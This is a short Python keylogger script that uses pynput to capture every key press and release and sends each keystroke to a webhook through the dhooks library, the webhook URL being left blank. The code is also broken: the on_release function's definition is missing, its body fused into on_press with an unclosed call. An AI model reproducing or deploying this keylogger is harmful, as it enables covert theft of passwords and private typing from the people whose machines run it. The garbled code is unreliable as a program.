from dhooks import Webhook
from pynput import keyboard

hook = Webhook("")

def on_press(key):
    try:
        hook.send('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        hook.send('special key {0} pressed'.format(

    hook.send('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

# Collect events until released
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
